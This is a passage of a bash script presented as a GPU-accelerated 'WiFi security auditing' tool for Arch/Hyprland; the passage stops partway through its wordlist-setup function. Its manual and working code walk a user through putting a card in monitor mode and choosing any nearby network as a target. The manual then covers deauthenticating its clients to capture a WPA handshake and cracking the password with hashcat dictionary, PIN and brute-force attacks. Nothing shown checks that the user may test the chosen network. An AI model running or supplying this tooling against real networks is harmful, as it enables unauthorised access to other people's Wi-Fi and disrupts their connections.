#!/usr/bin/env bash
# -----------------------------------------------------------------------------
# Name:        wifi_audit_gpu.sh
# Description: GPU-Accelerated WiFi Security Auditing Tool for Arch/Hyprland
# Hardware:    NVIDIA RTX 3050 Ti (4GB VRAM) + Intel AX-series Wi-Fi
# Author:      Elite DevOps
# Version:     3.1.4 (Sequential Ultimate Mask Edition)
# Requires:    Bash 5.0+, NVIDIA CUDA drivers, hcxtools, hashcat
# Extends:     wifi_audit.sh v3.1.3
# -----------------------------------------------------------------------------
# PIPELINE:
#   Phase 1 — Capture:    airodump-ng    → .cap
#   Phase 2 — Extraction: hcxpcapngtool → .hc22000  (strips 802.11 noise)
#   Phase 3 — Compute:    hashcat -m 22000 (GPU-accelerated PBKDF2-HMAC-SHA1)
# -----------------------------------------------------------------------------
# =============================================================================
# USER MANUAL & STEP-BY-STEP INSTRUCTIONS
# =============================================================================
#
# PREREQUISITES & PREPARATION:
# 1. Wordlists: On the first run, the script will create a directory for you,
#    typically at: ~/Documents/wifi_testing/list/
#    Place your custom wordlists or dictionaries in this folder. The script 
#    will automatically detect them. It also auto-detects standard RockYou 
#    installations (e.g., from the 'seclists' package).
# 2. Dependencies: The script auto-checks for required tools (Hashcat, 
#    hcxtools, Aircrack-ng, nvidia-smi, etc.). If any are missing, it will 
#    prompt you to install them via pacman.
#
# HOW TO RUN THE AUDIT:
# 
# STEP 1: Execute the Script
#    Run the script normally: `./wifi_audit_gpu.sh`
#    It will auto-elevate to root using sudo (required for monitor mode and 
#    raw socket access) while preserving your Wayland/Hyprland session variables 
#    so the clipboard integration still works.
#
# STEP 2: Interface & Target Selection
#    - The script will scan for your Wi-Fi interface and place it into 
#      Monitor Mode.
#    - It will launch a 10-second scan of the 2.4GHz and 5GHz spectrums.
#    - A formatted table of nearby networks will appear. Type the ID number 
#      of your target router and press ENTER.
#
# STEP 3: Choose Attack Vector
#    Select "1) WPA Handshake Capture + GPU Crack".
#    Next, select your Hashcat GPU strategy:
#      [A] Dictionary Attack: Best for normal words. Uses your wordlist folder
#          and applies 64 proven mutation rules (appending numbers, leet speak).
#      [B] 8-Digit Numeric: Best for default ISP PINs. Brute forces 00000000
#          through 99999999. No wordlist required.
#      [C] Custom Mask: You define the exact structure (e.g., ?d?d?d?d for a 
#          4-digit PIN). No wordlist required.
#      [D] Combination Attack: Glues two wordlists together (e.g., 'admin' + 
#          'password' = 'adminpassword').
#      [E] Smart Sequential Brute Force: Uses a dynamic .hcmask file to logically
#          stage attacks. Exhausts 8-12 pure numbers first, then moves to 
#          lowercase+numbers, then full alphanumeric, and finally ALL special chars.
#
# A) Rule-Based Dictionary Attack (-a 0)
# 
#     The Analogy: A bouncer at a club checking a VIP list, but the bouncer is also instructed to check if the person is wearing a fake mustache, a hat, or sunglasses.
# 
#     How it works: You provide a massive list of known human passwords (like the famous rockyou.txt which contains billions of leaked passwords). However, humans are slightly clever; they might capitalize the first letter or add "123" to the end.
# 
#     The Rules (best64.rule): Instead of just trying "password", Hashcat applies 64 mathematical mutation rules to it. It tries "Password", "password123", "p@ssw0rd", "drowssap" (reversed), etc.
# 
#     When to use it: This is always your first line of attack. It covers about 85% of real-world home Wi-Fi passwords because humans are remarkably predictable.
# 
# B) 8-Digit Numeric Brute Force (-a 3 ?d?d?d?d?d?d?d?d)
# 
#     The Analogy: A combination lock on a bicycle. You start at 00000000 and manually spin it to 99999999, trying every single possibility.
# 
#     How it works: It does not use a wordlist. ?d is Hashcat's code for "digit" (0-9). Because you put eight ?ds in a row, Hashcat will mathematically generate every possible 8-number combination.
# 
#     When to use it: Many older ISPs (like default AT&T or Xfinity routers) used random 8-digit or 10-digit PINs printed on the back of the router. Because the keyspace is exactly 100,000,000 combinations, your RTX 3050 Ti can exhaust this entire list in a couple of minutes.
# 
# C) Custom Mask Brute Force (-a 3)
# 
#     The Analogy: Knowing the format of a license plate (e.g., 3 Letters followed by 4 Numbers). You don't know the exact plate, but you know you shouldn't waste time guessing plates that start with a number.
# 
#     How it works: You write a "Mask" using character sets.
# 
#         ?l = lowercase (a-z)
# 
#         ?u = uppercase (A-Z)
# 
#         ?d = digit (0-9)
# 
#         ?s = special character (!@#$)
# 
#     Example: If you know your company Wi-Fi is always a capitalized word, 4 lowercase letters, and 2 numbers (e.g., "Apple99"), you would use the mask: ?u?l?l?l?l?d?d. Hashcat will only generate passwords that strictly fit that template.
# 
#     When to use it: When you have "insider knowledge" about the password policy or the physical structure of the password, but don't know the password itself.
# 
# D) Combination Attack (-a 1)
# 
#     The Analogy: A restaurant menu where you must pick one item from Column A and one item from Column B.
# 
#     How it works: You provide two wordlists (or the same wordlist twice). Hashcat glues every single word in the first list to every single word in the second list.
# 
#     Example: * List 1: ["Red", "Blue", "Green"]
# 
#         List 2: ["Dog", "Cat", "Bird"]
# 
#         Hashcat tests: RedDog, RedCat, RedBird, BlueDog, BlueCat...
# 
#     When to use it: When you suspect the target is using a "passphrase" made up of two distinct dictionary words pasted together.
#
# E) Smart Sequential Brute Force (.hcmask file)
#     
#     The Analogy: Systematically emptying the entire ocean with a bucket, starting with the shallow water first.
#     
#     How it works: Generates a custom maskfile that Hashcat processes strictly sequentially top-to-bottom. It guarantees all numbers up to 12 digits are exhausted before any letter is attempted, and guarantees all letters/numbers are exhausted before special characters are attempted.
#     
#     When to use it: When you have zero clues about the password and are willing to leave your laptop running for extended periods.
#
# STEP 4: The Handshake Capture (REQUIRES TWO TERMINALS)
#    - The script will generate an 'airodump-ng' command and copy it to your 
#      Hyprland clipboard automatically.
#    - OPEN A NEW TERMINAL WINDOW. Paste and run that exact command. This starts
#      the packet recorder on your target network.
#    - Return to the original script terminal and press ENTER.
#
# STEP 5: Deauthentication (Kicking Clients)
#    - The script scans the capture file for connected devices (phones, laptops).
#    - Choose a specific client or send a broadcast deauth to kick everyone.
#    - The script will blast deauthentication packets.
#    - LOOK AT YOUR SECOND TERMINAL: Wait for 'WPA handshake: [MAC]' to appear 
#      in the top right corner. 
#    - Once captured, tell the script 'y' to proceed to cracking. You can now 
#      close the second terminal.
#
# STEP 6: GPU Cracking Pipeline
#    - The script automatically converts the raw .cap file into the modern, 
#      cryptographically verified .hc22000 format.
#    - Hashcat launches, fully saturating your RTX 3050 Ti using the CUDA backend.
#    - Thermal Watchdog: The script actively polls your GPU temps. If it hits 
#      85°C, it safely checkpoints the session and pauses to prevent hardware damage.
#    - While Hashcat runs, you can press 's' for status, 'p' to pause, or 'q' 
#      to quit and save a checkpoint.
#
# STEP 7: Success & Cleanup
#    - If cracked, the plaintext password is printed in bright green and 
#      instantly copied to your Wayland clipboard.
#    - Pressing ENTER at the end triggers a secure cleanup trap. It kills zombie 
#      processes, takes your Wi-Fi card out of monitor mode, and restarts 
#      NetworkManager so your internet works normally again.
# =============================================================================

set -euo pipefail
IFS=$'\n\t'
shopt -s extglob

if ((BASH_VERSINFO[0] < 5)); then
    printf 'Error: This script requires Bash 5.0 or newer.\n' >&2
    exit 1
fi

# -----------------------------------------------------------------------------
# ANSI COLORS
# -----------------------------------------------------------------------------
if [[ -t 1 ]] && tput colors &>/dev/null && (($(tput colors) >= 8)); then
    readonly RED=$'\e[0;31m'
    readonly GREEN=$'\e[0;32m'
    readonly YELLOW=$'\e[1;33m'
    readonly BLUE=$'\e[0;34m'
    readonly CYAN=$'\e[0;36m'
    readonly MAGENTA=$'\e[0;35m'
    readonly BOLD=$'\e[1m'
    readonly NC=$'\e[0m'
else
    readonly RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''
fi

readonly SCAN_PREFIX="scan_dump"
readonly CLIENT_SCAN_PREFIX="client_scan"
readonly SCRIPT_PID="$$"
readonly SCRIPT_NAME="${0##*/}"

# -----------------------------------------------------------------------------
# GPU PIPELINE CONSTANTS
# -----------------------------------------------------------------------------
readonly HASHCAT_MODE=22000
readonly GPU_TEMP_ABORT=85
readonly HASHCAT_WORKLOAD=3
readonly HASHCAT_RULES_DIR="/usr/share/hashcat/rules"

# -----------------------------------------------------------------------------
# GLOBAL STATE
# -----------------------------------------------------------------------------
declare -g MON_IFACE=""
declare -g PHY_IFACE=""
declare -g ORIGINAL_NM_STATE=""
declare -g HANDSHAKE_DIR=""
declare -g LIST_DIR=""
declare -g TARGET_BSSID=""
declare -g TARGET_CH=""
declare -g TARGET_ESSID=""
declare -g TARGET_ESSID_SAFE=""
declare -g FINAL_WORDLIST=""
declare -ga CONNECTED_CLIENTS=()
declare -g CLEANUP_IN_PROGRESS=0

declare -g HC22000_FILE=""
declare -g HASHCAT_POTFILE=""
declare -g HASHCAT_SESSION_NAME=""
declare -g GPU_AVAILABLE=0
declare -g CUDA_AVAILABLE=0

# -----------------------------------------------------------------------------
# LOGGING
# -----------------------------------------------------------------------------
log_info()    { printf '%s[INFO]%s %s\n'    "$BLUE"    "$NC" "$1"; }
log_success() { printf '%s[OK]%s %s\n'      "$GREEN"   "$NC" "$1"; }
log_warn()    { printf '%s[WARN]%s %s\n'    "$YELLOW"  "$NC" "$1" >&2; }
log_err()     { printf '%s[ERR]%s %s\n'     "$RED"     "$NC" "$1" >&2; }
log_debug()   { [[ "${DEBUG:-0}" == "1" ]] && printf '%s[DEBUG]%s %s\n' "$CYAN" "$NC" "$1" >&2 || true; }
log_gpu()     { printf '%s[GPU]%s %s\n'     "$MAGENTA" "$NC" "$1"; }

die() { log_err "$1"; exit "${2:-1}"; }

# -----------------------------------------------------------------------------
# AUTO-ELEVATION
# -----------------------------------------------------------------------------
if [[ $EUID -ne 0 ]]; then
    log_info "Elevating permissions to root (required for hardware access)..."
    exec sudo --preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR,DISPLAY \
        bash -- "$0" "$@"
fi

if [[ -n "${SUDO_USER:-}" ]]; then
    readonly REAL_USER="$SUDO_USER"
    readonly REAL_HOME="$(getent passwd "$SUDO_USER" | cut -d: -f6)"
    readonly REAL_GROUP="$(id -gn "$SUDO_USER")"
    readonly REAL_UID="$(id -u "$SUDO_USER")"
else
    readonly REAL_USER="$(whoami)"
    readonly REAL_HOME="$HOME"
    readonly REAL_GROUP="$(id -gn)"
    readonly REAL_UID="$(id -u)"
fi

[[ -d "$REAL_HOME" ]] || die "User home directory not found: $REAL_HOME"

TMP_DIR="$(mktemp -d -t wifi_audit_gpu_XXXXXX 2>/dev/null)" || {
    printf 'Error: Failed to create temporary directory\n' >&2
    exit 1
}
readonly TMP_DIR

[[ -d "$TMP_DIR" && -w "$TMP_DIR" ]] || {
    printf 'Error: Temporary directory is not accessible\n' >&2
    exit 1
}

# -----------------------------------------------------------------------------
# RUN AS USER
# -----------------------------------------------------------------------------
run_as_user() {
    local xdg="${XDG_RUNTIME_DIR:-/run/user/$REAL_UID}"
    local -a env_args=("XDG_RUNTIME_DIR=$xdg")

    local wd="${WAYLAND_DISPLAY:-}"
    if [[ -z "$wd" ]]; then
        local sockets=("$xdg"/wayland-*)
        if [[ -e "${sockets[0]}" ]]; then
            wd="${sockets[0]##*/}"
        fi
    fi

    [[ -n "$wd" ]]                           && env_args+=("WAYLAND_DISPLAY=$wd")
    [[ -n "${DISPLAY:-}" ]]                  && env_args+=("DISPLAY=$DISPLAY")
    [[ -n "${DBUS_SESSION_BUS_ADDRESS:-}" ]] && env_args+=("DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS")

    sudo -u "$REAL_USER" env "${env_args[@]}" "$@"
}

# -----------------------------------------------------------------------------
# CLIPBOARD
# -----------------------------------------------------------------------------
copy_to_clipboard() {
    local text="$1"

    if command -v wl-copy &>/dev/null; then
        printf '%s' "$text" | run_as_user wl-copy --trim-newline 2>/dev/null && return 0
    fi

    if command -v xclip &>/dev/null; then
        printf '%s' "$text" | run_as_user xclip -selection clipboard 2>/dev/null
        return $?
    elif command -v xsel &>/dev/null; then
        printf '%s' "$text" | run_as_user xsel --clipboard --input 2>/dev/null
        return $?
    fi

    return 1
}

# -----------------------------------------------------------------------------
# CLEANUP TRAP
# -----------------------------------------------------------------------------
cleanup() {
    local exit_code=$?

    ((CLEANUP_IN_PROGRESS)) && return
    CLEANUP_IN_PROGRESS=1

    trap '' EXIT INT TERM HUP QUIT

    printf '\n'
    log_info "Initiating cleanup sequence..."

    local children
    children=$(jobs -p 2>/dev/null) || true
    if [[ -n "$children" ]]; then
        # shellcheck disable=SC2086
        kill -TERM $children 2>/dev/null || true
        sleep 0.5
        # shellcheck disable=SC2086
        kill -KILL $children 2>/dev/null || true
    fi

    pkill -f "airodump-ng.*${MON_IFACE:-notset}" 2>/dev/null || true
    pkill -f "aireplay-ng.*${MON_IFACE:-notset}"  2>/dev/null || true
    pkill -f "bully.*${MON_IFACE:-notset}"         2>/dev/null || true

    if pgrep -x hashcat &>/dev/null; then
        log_info "Sending SIGINT to hashcat (saving session checkpoint)..."
        pkill -SIGINT -x hashcat 2>/dev/null || true
        sleep 2
        pkill -SIGKILL -x hashcat 2>/dev/null || true
    fi

    sleep 0.5

    if [[ -n "${MON_IFACE:-}" ]] && ip link show "$MON_IFACE" &>/dev/null; then
        log_info "Stopping monitor mode on $MON_IFACE..."
        airmon-ng stop "$MON_IFACE" &>/dev/null || true
    fi

    if [[ "${ORIGINAL_NM_STATE:-}" == "active" ]]; then
        if ! systemctl is-active --quiet NetworkManager; then
            log_info "Restarting NetworkManager..."
            systemctl restart NetworkManager || log_warn "Failed to restart NetworkManager."
        fi
    elif [[ -z "${ORIGINAL_NM_STATE:-}" ]]; then
        systemctl start NetworkManager 2>/dev/null || true
    fi

    if [[ -n "${HANDSHAKE_DIR:-}" && -d "${HANDSHAKE_DIR:-}" ]]; then
        if [[ -n "${HC22000_FILE:-}" && -f "${HC22000_FILE:-}" ]]; then
            local dest_hash="${HANDSHAKE_DIR}/$(basename "${HC22000_FILE}")"
            cp -- "$HC22000_FILE" "$dest_hash" 2>/dev/null || true
            chown "$REAL_USER":"$REAL_GROUP" -- "$dest_hash" 2>/dev/null || true
            log_info "Hash file preserved: $dest_hash"
        fi
        if [[ -n "${HASHCAT_POTFILE:-}" && -f "${HASHCAT_POTFILE:-}" \
           && -s "${HASHCAT_POTFILE:-}" ]]; then
            local dest_pot="${HANDSHAKE_DIR}/$(basename "${HASHCAT_POTFILE}")"
            cp -- "$HASHCAT_POTFILE" "$dest_pot" 2>/dev/null || true
            chown "$REAL_USER":"$REAL_GROUP" -- "$dest_pot" 2>/dev/null || true
            log_info "Potfile preserved: $dest_pot"
        fi
    fi

    [[ -d "$TMP_DIR" ]] && rm -rf -- "$TMP_DIR"

    log_success "System returned to normal state."
    exit "$exit_code"
}

trap cleanup EXIT INT TERM HUP QUIT

# -----------------------------------------------------------------------------
# DEPENDENCY CHECK
# -----------------------------------------------------------------------------
check_deps() {
    if systemctl is-active --quiet NetworkManager 2>/dev/null; then
        ORIGINAL_NM_STATE="active"
    else
        ORIGINAL_NM_STATE="inactive"
    fi

    declare -A capture_deps=(
        ["aircrack-ng"]="aircrack-ng"
        ["bully"]="bully"
        ["wash"]="reaver"
        ["gawk"]="gawk"
        ["lspci"]="pciutils"
        ["timeout"]="coreutils"
        ["iw"]="iw"
    )

    declare -A gpu_deps=(
        ["hcxpcapngtool"]="hcxtools"
        ["hashcat"]="hashcat"
        ["nvidia-smi"]="nvidia-utils"
    )

    local -a missing_pkgs=()
    local binary

    for binary in "${!capture_deps[@]}"; do
        command -v "$binary" &>/dev/null || missing_pkgs+=("${capture_deps[$binary]}")
    done
    for binary in "${!gpu_deps[@]}"; do
        command -v "$binary" &>/dev/null || missing_pkgs+=("${gpu_deps[$binary]}")
    done

    if ((${#missing_pkgs[@]} > 0)); then
        log_warn "Missing dependencies: ${missing_pkgs[*]}"
        printf 'Options:\n'
        printf '1) Install with existing package database (pacman -S)\n'
        printf '2) Full system upgrade + install (pacman -Syu) [Recommended]\n'
        printf '3) Exit and install manually\n'

        local choice
        read -r -p "Selection [2]: " choice
        choice="${choice:-2}"

        case "$choice" in
            1) pacman -S  --noconfirm --needed "${missing_pkgs[@]}" || die "Failed to install dependencies." ;;
            2) pacman -Syu --noconfirm --needed "${missing_pkgs[@]}" || die "Failed to install dependencies." ;;
            *) log_info "Please install: ${missing_pkgs[*]}"; exit 0 ;;
        esac
    fi

    if ! command -v wl-copy &>/dev/null && \
       ! command -v xclip  &>/dev/null && \
       ! command -v xsel   &>/dev/null; then
        log_warn "No clipboard tool found. Install 'wl-clipboard' (Wayland) or 'xclip' (X11)."
    fi

    log_success "All dependencies satisfied."
}

# -----------------------------------------------------------------------------
# PATH VALIDATION
# -----------------------------------------------------------------------------
validate_path() {
    local path="$1"
    [[ -z "$path" ]] && return 1

    local dangerous_chars=$'`$();&|<>!*?[]{}\'"\\'
    local char i
    for ((i=0; i<${#dangerous_chars}; i++)); do
        char="${dangerous_chars:i:1}"
        if [[ "$path" == *"$char"* ]]; then
            log_debug "Path contains dangerous character: $char"
            return 1
        fi
    done

    if [[ "$path" =~ [[:cntrl:]] ]]; then
        local cleaned="${path//$'\t'/}"
        cleaned="${cleaned//$'\n'/}"
        [[ "$cleaned" =~ [[:cntrl:]] ]] && return 1
    fi

    [[ "$path" == -* ]] && return 1
    return 0
}

# -----------------------------------------------------------------------------
# DIRECTORY SETUP
# -----------------------------------------------------------------------------
setup_directories() {
    local default_project_dir="$REAL_HOME/Documents/wifi_testing"
    local default_handshake_dir="$default_project_dir/handshake"
    local default_list_dir="$default_project_dir/list"

    printf '\n'
    log_info "Configuration: Handshake Storage"
    printf 'Default: %s\n' "$default_handshake_dir"

    local user_hs_path
    read -r -p "Press ENTER to use default, or type a custom path: " user_hs_path

    if [[ -z "$user_hs_path" ]]; then
        HANDSHAKE_DIR="$default_handshake_dir"
    elif validate_path "$user_hs_path"; then
        HANDSHAKE_DIR="${user_hs_path%/}"
    else
        log_warn "Invalid characters in path. Using default."
        HANDSHAKE_DIR="$default_handshake_dir"
    fi

    if [[ ! -d "$HANDSHAKE_DIR" ]]; then
        run_as_user mkdir -p -- "$HANDSHAKE_DIR" 2>/dev/null \
            || mkdir -p -- "$HANDSHAKE_DIR" \
            || die "Failed to create handshake directory"
    fi

    if [[ -d "$default_project_dir" ]]; then
        chown -R "$REAL_USER":"$REAL_GROUP" -- "$default_project_dir" 2>/dev/null || true
        chmod -R u=rwX,g=rX,o=rX          -- "$default_project_dir" 2>/dev/null || true
    fi

    chown -R "$REAL_USER":"$REAL_GROUP" -- "$HANDSHAKE_DIR" 2>/dev/null || true
    chmod -R u=rwX,g=rX,o=rX          -- "$HANDSHAKE_DIR" 2>/dev/null || true
    log_success "Handshakes will be saved to: $HANDSHAKE_DIR"

    printf '\n'
    log_info "Configuration: Password Wordlists"
    printf 'Default: %s\n' "$default_list_dir"

    local user_list_path
    read -r -p "Press ENTER to use default, or type a custom path: " user_list_path

    if [[ -z "$user_list_path" ]]; then
        LIST_DIR="$default_list_dir"
    elif validate_path "$user_list_path"; then
        LIST_DIR="${user_list_path%/}"
    else
        log_warn "Invalid characters in path. Using default."
        LIST_DIR="$default_list_dir"
    fi

    if [[ ! -d "$LIST_DIR" ]]; then
        run_as_user mkdir -p -- "$LIST_DIR" 2>/dev/null \
            || mkdir -p -- "$LIST_DIR" \
            || die "Failed to create wordlist directory"
        log_warn "Directory $LIST_DIR created (currently empty)."
    fi

    chown -R "$REAL_USER":"$REAL_GROUP" -- "$LIST_DIR" 2>/dev/null || true
    chmod -R u=rwX,g=rX,o=rX          -- "$LIST_DIR" 2>/dev/null || true
}

# -----------------------------------------------------------------------------
# INTERFACE UTILITIES
# -----------------------------------------------------------------------------
get_interfaces_by_type() {
    local target_type="$1"
    iw dev 2>/dev/null | awk -v type="$target_type" '
        $1 == "Interface" { name = $2; next }
        $1 == "type"      { if ($2 == type && name != "") print name; name = "" }
    '
}

select_interface() {
    log_info "Scanning for wireless interfaces..."

    local -a interfaces
    mapfile -t interfaces < <(get_interfaces_by_type "managed")

    if ((${#interfaces[@]} == 0)); then
        local -a monitors
        mapfile -t monitors < <(get_interfaces_by_type "monitor")

        if ((${#monitors[@]} > 0)); then
            log_warn "No managed interfaces found. Detected active monitor: ${monitors[*]}"
            log_info "Attempting to reset interfaces..."
            local mon
            for mon in "${monitors[@]}"; do
                airmon-ng stop "$mon" &>/dev/null || true
            done
            sleep 2
            mapfile -t interfaces < <(get_interfaces_by_type "managed")
            ((${#interfaces[@]} > 0)) || die "Failed to reset interfaces. Reload WiFi modules."
            log_success "Interface reset successful."
        else
            die "No wireless interfaces found."
        fi
    fi

    if ((${#interfaces[@]} == 1)); then
        PHY_IFACE="${interfaces[0]}"
        log_success "Auto-selected interface: $PHY_IFACE"
    else
        printf 'Select interface:\n'
        local PS3="Enter selection: "
        select iface in "${interfaces[@]}"; do
            if [[ -n "$iface" ]]; then
                PHY_IFACE="$iface"
                break
            else
                log_warn "Invalid selection. Try again."
            fi
        done
    fi

    [[ -n "${PHY_IFACE:-}" ]] || die "No interface selected."
}

# -----------------------------------------------------------------------------
# HARDWARE DETECTION & MONITOR MODE
# -----------------------------------------------------------------------------
detect_hardware() {
    if lspci 2>/dev/null | grep -qi "Network controller.*Intel"; then
        log_success "Detected Intel Wi-Fi Hardware."
        return 0
    fi
    log_info "Detected Generic/Other Wi-Fi Hardware."
    return 1
}

enable_monitor_mode() {
    log_info "Killing conflicting processes..."
    airmon-ng check kill &>/dev/null || true

    log_info "Enabling Monitor Mode on $PHY_IFACE..."
    local output
    output=$(airmon-ng start "$PHY_IFACE" 2>&1) || die "Failed to start monitor mode: $output"
    sleep 1

    MON_IFACE=$(iw dev 2>/dev/null | awk '
        /Interface/    { name = $2; next }
        /type monitor/ { if (name != "") print name; name = "" }
    ' | head -n1)

    if [[ -z "$MON_IFACE" ]]; then
        MON_IFACE=$(printf '%s' "$output" \
            | grep -oP 'monitor mode.*enabled on \K[^\)]+' \
            | tr -d '[:space:][]')
    fi

    if [[ -z "$MON_IFACE" ]]; then
        local candidate
        for candidate in "${PHY_IFACE}mon" "wlan0mon" "wlan1mon"; do
            if ip link show "$candidate" &>/dev/null; then
                MON_IFACE="$candidate"
                break
            fi
        done
    fi

    [[ -n "$MON_IFACE" ]] || die "Could not determine monitor interface name."
    log_success "Monitor mode active on: $MON_IFACE"
    ip link set "$MON_IFACE" up &>/dev/null || true

    if detect_hardware; then
        log_info "Attempting Intel optimizations (Power Save OFF)..."
        iw dev "$MON_IFACE" set power_save off 2>/dev/null \
            || printf '      (Note: kernel-enforced power management active — normal for AX201)\n'
    else
        iw dev "$MON_IFACE" set power_save off 2>/dev/null || true
    fi
}

# -----------------------------------------------------------------------------
# NETWORK SCANNING
# -----------------------------------------------------------------------------
scan_targets() {
    rm -f -- "$TMP_DIR/$SCAN_PREFIX"* 2>/dev/null || true

    log_info "Starting network scan (2.4 GHz & 5 GHz)..."
    log_info "Scanning for 10 seconds. Please wait..."

    local scan_duration=10
    local timeout_duration=$((scan_duration + 10))

    timeout --signal=SIGTERM "${timeout_duration}s" \
        airodump-ng --band abg \
        -w "$TMP_DIR/$SCAN_PREFIX" \
        --output-format csv \
        --write-interval 1 \
        -- "$MON_IFACE" &>/dev/null &
    local scan_pid=$!

    local i
    for ((i=scan_duration; i>0; i--)); do
        printf '\rScanning... %2d ' "$i"
        sleep 1
    done
    printf '\rScanning... Done.\n'

    kill "$scan_pid" &>/dev/null || true
    wait "$scan_pid" 2>/dev/null || true
    sync
    sleep 1

    local csv_file="$TMP_DIR/$SCAN_PREFIX-01.csv"
    [[ -f "$csv_file" ]] || die "Scan failed to generate output."

    log_info "Parsing targets..."
    printf '\n'

    local -a target_lines
    mapfile -t target_lines < <(gawk -F',' '
        BEGIN { IGNORECASE = 1 }
        /Station MAC/ { exit }
        $1 ~ /^[[:space:]]*([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}[[:space:]]*$/ {
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $9)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14)

            bssid=$1; pwr=$9; ch=int($4); priv=$6; essid=$14
            if (length(essid) < 1) next

            if      (ch < 1 || ch > 196) { band="N/A"; ch=0 }
            else if (ch >= 1  && ch <= 14) { band="2.4G" }
            else if (ch >= 32)             { band="5G"   }
            else                           { band="N/A"  }

            printf "%s,%s,%d,%s,%s,%s\n", bssid, pwr, ch, band, priv, essid
        }
    ' "$csv_file")

    ((${#target_lines[@]} > 0)) || die "No networks found. Try scanning again."

    printf '%s%-3s | %-17s | %-4s | %-4s | %-5s | %-8s | %s%s\n' \
        "$CYAN" "ID" "BSSID" "PWR" "CH" "BAND" "SEC" "ESSID" "$NC"
    printf '%.0s-' {1..75}
    printf '\n'

    local -a bssids=() channels=() essids=()
    local idx=1 line bssid pwr ch band priv essid

    for line in "${target_lines[@]}"; do
        IFS=',' read -r bssid pwr ch band priv essid <<< "$line"
        bssids+=("$bssid")
        channels+=("$ch")
        essids+=("$essid")
        printf '%-3d | %s | %-4s | %-4s | %-5s | %-8s | %s\n' \
            "$idx" "$bssid" "$pwr" "$ch" "$band" "$priv" "$essid"
        ((idx++))
    done

    printf '\n'
    local selection
    while true; do
        read -r -p "Select Target ID: " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && \
           ((selection >= 1 && selection <= ${#bssids[@]})); then
            break
        fi
        log_warn "Invalid selection. Enter a number between 1 and ${#bssids[@]}."
    done

    local sel_idx=$((selection - 1))
    TARGET_BSSID="${bssids[sel_idx]}"
    TARGET_CH="${channels[sel_idx]}"
    TARGET_ESSID="${essids[sel_idx]}"

    TARGET_ESSID_SAFE="${TARGET_ESSID//[^a-zA-Z0-9_-]/_}"
    TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE//+(_)/_}"
    TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE#_}"
    TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE%_}"
    [[ -n "$TARGET_ESSID_SAFE" ]] || TARGET_ESSID_SAFE="network"

    log_success "Target Locked: $TARGET_ESSID ($TARGET_BSSID) on CH $TARGET_CH"
}

# -----------------------------------------------------------------------------
# ROCKYOU FINDER
# -----------------------------------------------------------------------------
find_rockyou() {
    local -a paths=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz"
        "$REAL_HOME/wordlists/rockyou.txt"
        "$REAL_HOME/.wordlists/rockyou.txt"
        "/opt/wordlists/rockyou.txt"
        "/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt"
    )
    local p
    for p in "${paths[@]}"; do
        [[ -f "$p" && -r "$p" ]] && { printf '%s' "$p"; return 0; }
    done
    return 1
}

# -----------------------------------------------------------------------------
# WORDLIST PREPARATION
# -----------------------------------------------------------------------------
prepare_wordlist() {
    local attack_type="$1"
    log_info "Preparing wordlists from: $LIST_DIR"

    local -a list_files
    mapfile -t list_files < <(find "$LIST_DIR" -maxdepth 1 -type f 2>/dev/null | sort)

    if ((${#list_files[@]} > 0)); then
        if [[ "$attack_type" == "D" ]]; then
            log_warn "Combination attack (-a 1) requires exactly two explicit wordlist files."
            if ((${#list_files[@]} == 1)); then
                FINAL_WORDLIST="${list_files[0]}"
                log_success "Auto-selected primary wordlist: $(basename "$FINAL_WORDLIST")"
            else
                log_info "Multiple files found. Select the PRIMARY wordlist:"
                local i=1 f
                for f in "${list_files[@]}"; do
                    printf '  %d) %s\n' "$i" "$(basename "$f")"
                    ((i++))
                done
                
                local wl_choice
                while true; do
                    read -r -p "Select primary wordlist [1-${#list_files[@]}]: " wl_choice
                    if [[ "$wl_choice" =~ ^[0-9]+$ ]] && ((wl_choice >= 1 && wl_choice <= ${#list_files[@]})); then
                        FINAL_WORDLIST="${list_files[$((wl_choice-1))]}"
                        log_success "Selected primary wordlist: $(basename "$FINAL_WORDLIST")"
                        break
                    fi
                    log_warn "Invalid selection."
                done
            fi
        else
            log_success "Found ${#list_files[@]} list(s). Passing directory to hashcat natively."
            FINAL_WORDLIST="$LIST_DIR"
        fi
        return
    fi

    log_warn "No files found in $LIST_DIR."
    local rockyou_path=""
    if rockyou_path=$(find_rockyou 2>/dev/null); then
        printf 'Options:\n'
        printf '1) Use detected RockYou (%s)\n' "$rockyou_path"
        printf '2) Enter custom path manually\n'

        local wl_select
        read -r -p "Selection [1/2] (Default 1): " wl_select
        wl_select="${wl_select:-1}"

        case "$wl_select" in
            2)
                local custom_wl
                read -r -p "Enter full path to wordlist: " custom_wl
                if [[ -f "$custom_wl" && -r "$custom_wl" ]]; then
                    FINAL_WORDLIST="$custom_wl"
                else
                    log_err "File not found or not readable."
                    FINAL_WORDLIST=""
                fi
                ;;
            *)
                if [[ "$rockyou_path" == *.gz ]]; then
                    log_info "Decompressing rockyou.txt.gz..."
                    FINAL_WORDLIST="$TMP_DIR/rockyou.txt"
                    zcat -- "$rockyou_path" > "$FINAL_WORDLIST" 2>/dev/null || {
                        log_warn "Failed to decompress rockyou.txt.gz"
                        FINAL_WORDLIST=""
                    }
                else
                    FINAL_WORDLIST="$rockyou_path"
                fi
                ;;
        esac
    else
        log_warn "RockYou wordlist not found in common locations."
        log_info "Install with: sudo pacman -S seclists"

        local custom_wl
        read -r -p "Enter full path to wordlist (or ENTER to skip): " custom_wl

        if [[ -n "$custom_wl" && -f "$custom_wl" && -r "$custom_wl" ]]; then
            FINAL_WORDLIST="$custom_wl"
        else
